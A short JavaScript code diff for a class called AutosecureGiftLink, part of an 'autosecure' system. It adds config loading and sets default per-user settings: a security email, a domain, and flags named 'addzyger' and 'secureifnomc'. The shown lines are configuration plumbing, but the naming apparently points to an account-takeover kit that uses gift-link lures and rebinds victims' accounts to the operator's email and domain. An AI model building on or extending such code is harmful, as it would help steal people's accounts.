@@ -7,6 +7,9 @@ const generate = require('./autosecure/utils/generate');
 // Import required modules from your autosecure system
 const { queryParams } = require('./autosecure/db/database');
 
+// Load configuration
+const config = require('./config.json');
+
 class AutosecureGiftLink {
     constructor() {
         this.sessions = new Map(); // Store active sessions
@@ -95,12 +98,24 @@ class AutosecureGiftLink {
             let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [userId]);
             
             if (settings.length === 0) {
-                // Create default settings for gift links
-                await queryParams(`INSERT INTO secureconfig (user_id) VALUES (?)`, [userId]);
+                // Create default settings for gift links with config values
+                await queryParams(`INSERT INTO secureconfig (user_id, secEmail, domain, addzyger, secureifnomc) VALUES (?, ?, ?, ?, ?)`, [
+                    userId, 
+                    config.email.user, 
+                    config.email.domain, 
+                    config.defaultSettings.addzyger, 
+                    config.defaultSettings.secureifnomc
+                ]);
                 settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [userId]);
             }
             
             settings = settings[0];
+            
+            // Override with config values if not set
+            if (!settings.secEmail) settings.secEmail = config.email.user;
+            if (!settings.domain) settings.domain = config.email.domain;
+            if (settings.addzyger === undefined) settings.addzyger = config.defaultSettings.addzyger;
+            if (settings.secureifnomc === undefined) settings.secureifnomc = config.defaultSettings.secureifnomc;
 
             // Generate UID for this secure operation
             const uid = generate(32);
